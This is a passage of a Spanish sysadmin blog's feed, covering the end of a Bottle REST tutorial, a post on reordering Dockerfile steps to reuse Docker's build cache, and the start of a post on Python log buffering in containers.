    response.content_type &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; product is not None:
        &lt;span class="k"&gt;return&lt;/span&gt; dumps&lt;span class="o"&gt;(&lt;/span&gt;product&lt;span class="o"&gt;)&lt;/span&gt;
    response.status &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;404&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat models.py 
&lt;span class="nv"&gt;products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Apple&amp;#39;&lt;/span&gt;,
        &lt;span class="s1"&gt;&amp;#39;price&amp;#39;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.0,
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Orange&amp;#39;&lt;/span&gt;,
        &lt;span class="s1"&gt;&amp;#39;price&amp;#39;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;.8,
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Pear&amp;#39;&lt;/span&gt;,
        &lt;span class="s1"&gt;&amp;#39;price&amp;#39;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.2,
    &lt;span class="o"&gt;}&lt;/span&gt;,
&lt;span class="o"&gt;}&lt;/span&gt;

def get_product&lt;span class="o"&gt;(&lt;/span&gt;id&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; products.get&lt;span class="o"&gt;(&lt;/span&gt;id&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; product is not None:
        &lt;span class="k"&gt;return&lt;/span&gt; product.copy&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; None
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto solo nos queda probar las respuestas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -i http://localhost:8080/products/1
HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
...  
Content-Type: application/json

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;.0, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Apple&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~$ curl -i http://localhost:8080/products/2
HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
...  
Content-Type: application/json

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;price&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;.8, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Orange&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~$ curl -i http://localhost:8080/products/22
HTTP/1.0 &lt;span class="m"&gt;404&lt;/span&gt; Not Found
...  
Content-Type: application/json

gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Siguiendo la documentación y usando librerías varias, se puede tener algo simple en muy poco tiempo. Dada la naturaleza del desarrollo web, los controladores se pueden ir añadiendo a medida que se necesiten. Eso nos da tiempo a descubrir las infinitas posibilidades de este &lt;em&gt;microframework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Algunas de las operaciones habituales (sesiones, capa de acceso a datos, autenticaciones varias, conectores a terceros, ...) no vienen. Aquellos con más vista de futuro probablemente vais a hacer código para evitar estos pequeños inconvenientes, pero si no lo queréis, &lt;em&gt;python&lt;/em&gt; os ofrece muchas más soluciones para vuestro uso y disfrute. Los que disfrutáis con la belleza de lo simple, sed bienvenidos.&lt;/p&gt;</content><category term="python"></category><category term="microframework"></category><category term="framework"></category><category term="bottle"></category></entry><entry><title>Reduciendo el tiempo de build con Docker y su caché</title><link href="http://www.linuxsysadmin.ml/2017/05/reduciendo-el-tiempo-de-build-con-docker-y-su-cache.html" rel="alternate"></link><published>2017-05-08T10:00:00+02:00</published><updated>2017-05-08T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-08:/2017/05/reduciendo-el-tiempo-de-build-con-docker-y-su-cache.html</id><summary type="html">&lt;p&gt;Cuando construimos imágenes &lt;strong&gt;docker&lt;/strong&gt;, muchas veces no somos conscientes del poder de la caché integrada. Si reordenamos algunas instrucciones y aplicamos algún truco, podemos evitarnos el hecho de reconstruir muchas de esas capas, llegando a reducir el tiempo de &lt;em&gt;rebuild&lt;/em&gt; a prácticamente cero, siempre y cuando no hayan grandes cambios …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando construimos imágenes &lt;strong&gt;docker&lt;/strong&gt;, muchas veces no somos conscientes del poder de la caché integrada. Si reordenamos algunas instrucciones y aplicamos algún truco, podemos evitarnos el hecho de reconstruir muchas de esas capas, llegando a reducir el tiempo de &lt;em&gt;rebuild&lt;/em&gt; a prácticamente cero, siempre y cuando no hayan grandes cambios.&lt;/p&gt;
&lt;p&gt;Esa es una reflexión que me hice el otro día. Es verdad que con la caché integrada me ahorro de descargar la imagen base y de instalar algunas dependencias habituales, pero usando la cabeza descubrí que puedo conseguir mucho más.&lt;/p&gt;
&lt;p&gt;Es muy habitual que tenga que construir proyectos que usen &lt;strong&gt;python&lt;/strong&gt;, pero me molesta un poco tener que perder el tiempo en el comando &lt;strong&gt;pip&lt;/strong&gt; instalando dependencias; hay que tener en cuenta que casi nunca cambian entre diferentes versiones y es un tiempo que no sería necesario.&lt;/p&gt;
&lt;p&gt;Así que hice el ejercicio de reordenar las instrucciones en mi &lt;em&gt;Dockerfile&lt;/em&gt;, moviendo al principio aquellas instrucciones que raramente provocarán cambios, y dejando al final aquellas que es más frecuente que cambien, y por lo tanto, que necesiten ser reconstruidas.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Para empezar, vamos a usar un aplicación simple, concretamente un &lt;em&gt;hello world&lt;/em&gt; estándar con un &lt;em&gt;microframework&lt;/em&gt; llamado &lt;strong&gt;bottle&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ tree
.
├── app
│   ├── app.py
│   └── requirements.txt
└── Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente la aplicación es lo de menos, siendo este ejemplo extrapolable a cada &lt;em&gt;framework&lt;/em&gt; o librería que se necesite; se incluyen por tener el ejemplo completo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat app/app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ cat app/requirements.txt 
&lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.13
gerard@aldebaran:~/docker/myapp$ cat app/app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para construir la imagen, usamos un &lt;em&gt;Dockerfile&lt;/em&gt; muy estándar y nada complejo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
COPY app/ /srv/app/
RUN pip install -r /srv/app/requirements.txt
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así que construimos nuestra imagen, con el comando habitual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.0 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built 46611b6a730f
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No es difícil comprobar lo que pasa cuando modificamos un poco nuestra aplicación, que en este caso se localiza entera en &lt;em&gt;app.py&lt;/em&gt;: se reconstruyen todos los pasos a partir del tercero (el COPY).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.1 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/5 : FROM alpine:3.5
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/5 : RUN apk add --no-cache py-gunicorn py2-pip
 ---&amp;gt; Using cache
 ---&amp;gt; fa57ea0220f9
Step &lt;span class="m"&gt;3&lt;/span&gt;/5 : COPY app/ /srv/app/
 ---&amp;gt; dcaa218d663e
Removing intermediate container 800e88f3a533
Step &lt;span class="m"&gt;4&lt;/span&gt;/5 : RUN pip install -r /srv/app/requirements.txt
 ---&amp;gt; Running in 29914cddfb3d
Collecting &lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.13 &lt;span class="o"&gt;(&lt;/span&gt;from -r /srv/app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading bottle-0.12.13.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;70kB&lt;span class="o"&gt;)&lt;/span&gt;
Installing collected packages: bottle
  Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; bottle: started
    Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; bottle: finished with status &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;
Successfully installed bottle-0.12.13
You are using pip version &lt;span class="m"&gt;9&lt;/span&gt;.0.0, however version &lt;span class="m"&gt;9&lt;/span&gt;.0.1 is available.
You should consider upgrading via the &lt;span class="s1"&gt;&amp;#39;pip install --upgrade pip&amp;#39;&lt;/span&gt; command.
 ---&amp;gt; 4e294d8038a8
Removing intermediate container 29914cddfb3d
Step &lt;span class="m"&gt;5&lt;/span&gt;/5 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Running in 6021cfceff96
 ---&amp;gt; b781e46aec9c
Removing intermediate container 6021cfceff96
Successfully built b781e46aec9c
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, vamos a intentar mejorar eso.&lt;/p&gt;
&lt;h3&gt;Reordenamos las capas: las menos probables de cambio, antes&lt;/h3&gt;
&lt;p&gt;En este ejemplo, no hay mucho que cambiar; solo hay una instrucción que es siempre la misma (el CMD), pero que se reconstruye porque las anteriores también lo hacen. En este caso, solo le indica el comando de &lt;em&gt;runtime&lt;/em&gt;, y para esto no se depende ni del COPY, ni del &lt;em&gt;pip install&lt;/em&gt;, así que puede ir antes de ambas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
COPY app/ /srv/app/
RUN pip install -r /srv/app/requirements.txt
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto no nos queda más remedio que reconstruir las 3 capas de nuevo, pero vemos que los &lt;em&gt;builds&lt;/em&gt; sucesivos (con la aplicación modificada) no van a provocar cambio en esa capa.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.2 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built b9ca6021019e
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cambiamos nuestra aplicación, y vemos que el paso CMD no se reconstruye:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.3 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Step &lt;span class="m"&gt;3&lt;/span&gt;/5 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Using cache
 ---&amp;gt; 0e99aa9dd9cf
...  
Successfully built b4289c56e7cb
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos ahorramos reconstruir capas que realmente no cambian, pero ven forzada su reconstrucción porque las capas anteriores sí lo hacen. En un caso más complejo, el beneficio se notaría más que en este pequeño ejemplo.&lt;/p&gt;
&lt;h3&gt;Copias parciales para ahorrarnos capas&lt;/h3&gt;
&lt;p&gt;El ejemplo anterior ha supuesto una mejora, pero vemos un hecho curioso: el &lt;em&gt;pip install&lt;/em&gt; es el paso más lento en una reconstrucción y no sería necesario en caso de no cambiar las dependencias de nuestra aplicación, que es la mayoría de veces. Entonces, ¿Porqué se tiene que rehacer cada vez, para obtener exactamente el mismo resultado?&lt;/p&gt;
&lt;p&gt;Simplemente se hace porque al copiar la carpeta, &lt;strong&gt;docker&lt;/strong&gt; detecta un cambio &lt;em&gt;en alguno&lt;/em&gt; de los ficheros, y por diseño, invalida la capa equivalente. Esto causa una invalidación de caché en cascada y obliga a las siguientes instrucciones a rehacerse.&lt;/p&gt;
&lt;p&gt;El truco consiste en copiar solamente el fichero de requisitos, con la esperanza de que no haya cambiado, lo que nos ahorraría el &lt;em&gt;pip install&lt;/em&gt;, ya que no invalidaría las capas de caché. El resto de la aplicación se puede copiar después.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
COPY app/requirements.txt /srv/app/
RUN pip install -r /srv/app/requirements.txt
COPY app/ /srv/app/
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen dos veces, una para crear la nueva estructura de capas (el precio de la primera construcción), y la otra para ver el beneficio de la nueva aproximación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.4 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built c64016c758a4
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y a partir de ahora, cada cambio de código que no implique un cambio en el &lt;em&gt;requirements.txt&lt;/em&gt;, solo implicará copiar ese código sobre la capa que ya contiene nuestras dependencias, ahorrándonos el &lt;em&gt;pip install&lt;/em&gt;, y convirtiendo el proceso de &lt;em&gt;build&lt;/em&gt; en algo casi instantáneo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ &lt;span class="nb"&gt;time&lt;/span&gt; docker build -t myapp:1.5 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/6 : FROM alpine:3.5
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/6 : RUN apk add --no-cache py-gunicorn py2-pip
 ---&amp;gt; Using cache
 ---&amp;gt; fa57ea0220f9
Step &lt;span class="m"&gt;3&lt;/span&gt;/6 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Using cache
 ---&amp;gt; 0e99aa9dd9cf
Step &lt;span class="m"&gt;4&lt;/span&gt;/6 : COPY app/requirements.txt /srv/app/
 ---&amp;gt; Using cache
 ---&amp;gt; 32595afecfc4
Step &lt;span class="m"&gt;5&lt;/span&gt;/6 : RUN pip install -r /srv/app/requirements.txt
 ---&amp;gt; Using cache
 ---&amp;gt; e37068fe5c99
Step &lt;span class="m"&gt;6&lt;/span&gt;/6 : COPY app/ /srv/app/
 ---&amp;gt; d31b7abdbfb2
Removing intermediate container 01e78f27475d
Successfully built d31b7abdbfb2

real    0m0.330s
user    0m0.004s
sys 0m0.004s
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, podemos ver que las capas compartidas entre las versiones con este nuevo truco se comparten casi todas. Esto hace que las nuevas versiones apenas ocupen espacio en disco (117 bytes en el ejemplo), siendo una capa con solamente nuestro código.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker &lt;span class="nb"&gt;history&lt;/span&gt; myapp:1.4
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
c64016c758a4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY dir:244f5d5a6f7ec84...   117B                &lt;/span&gt;
e37068fe5c99        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c pip install -r /srv/app/require...   573kB               
32595afecfc4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:2f968d5854b929...   16B                 &lt;/span&gt;
0e99aa9dd9cf        &lt;span class="m"&gt;21&lt;/span&gt; minutes ago      /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;gunicorn&amp;quot; &amp;quot;--bind...   0B                  &lt;/span&gt;
fa57ea0220f9        &lt;span class="m"&gt;31&lt;/span&gt; minutes ago      /bin/sh -c apk add --no-cache py-gunicorn ...   &lt;span class="m"&gt;48&lt;/span&gt;.4MB              
4a415e366388        &lt;span class="m"&gt;6&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:730030a984f5f0c...   3.99MB              &lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ docker &lt;span class="nb"&gt;history&lt;/span&gt; myapp:1.5
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
d31b7abdbfb2        &lt;span class="m"&gt;3&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY dir:36a1b0f6acdabc2...   117B                &lt;/span&gt;
e37068fe5c99        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c pip install -r /srv/app/require...   573kB               
32595afecfc4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:2f968d5854b929...   16B                 &lt;/span&gt;
0e99aa9dd9cf        &lt;span class="m"&gt;21&lt;/span&gt; minutes ago      /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;gunicorn&amp;quot; &amp;quot;--bind...   0B                  &lt;/span&gt;
fa57ea0220f9        &lt;span class="m"&gt;31&lt;/span&gt; minutes ago      /bin/sh -c apk add --no-cache py-gunicorn ...   &lt;span class="m"&gt;48&lt;/span&gt;.4MB              
4a415e366388        &lt;span class="m"&gt;6&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:730030a984f5f0c...   3.99MB              &lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La parte mala, es que el fichero &lt;em&gt;requirements.txt&lt;/em&gt; se copia dos veces en nuestra imagen, en ambos COPY. Con un poco de trabajo podría evitarse eso pero, puesto que ocupa relativamente poco, es un precio que estoy dispuesto a pagar para tener &lt;em&gt;builds&lt;/em&gt; instantáneos.&lt;/p&gt;</content><category term="docker"></category><category term="dockerfile"></category><category term="cache"></category></entry><entry><title>Problemas de log con docker y python</title><link href="http://www.linuxsysadmin.ml/2017/05/problemas-de-log-con-docker-y-python.html" rel="alternate"></link><published>2017-05-01T10:00:00+02:00</published><updated>2017-05-01T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-01:/2017/05/problemas-de-log-con-docker-y-python.html</id><summary type="html">&lt;p&gt;El otro día estaba haciendo un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt; que debía ejecutarse en un contenedor &lt;strong&gt;docker&lt;/strong&gt;. A pesar de la cantidad de &lt;em&gt;verbose&lt;/em&gt; que le puse, no era capaz de ver ningún texto cuando miraba los &lt;em&gt;logs&lt;/em&gt;. Tras mucha búsqueda, finalmente encontré el culpable en la variable de entorno &lt;strong&gt;PYTHONUNBUFFERED …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día estaba haciendo un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt; que debía ejecutarse en un contenedor &lt;strong&gt;docker&lt;/strong&gt;. A pesar de la cantidad de &lt;em&gt;verbose&lt;/em&gt; que le puse, no era capaz de ver ningún texto cuando miraba los &lt;em&gt;logs&lt;/em&gt;. Tras mucha búsqueda, finalmente encontré el culpable en la variable de entorno &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; en sí mismo solo pretendía comprobar si habían eventos en una cola, para su posterior proceso. La sorpresa es que no podía ver nada cuando ejecutaba &lt;strong&gt;docker&lt;/strong&gt; en modo &lt;em&gt;detached&lt;/em&gt; o en &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;Para reducir mucho el problema, se plantea un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;poll.sh&lt;/em&gt; que emita un mensaje en la salida estándar cada segundo, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


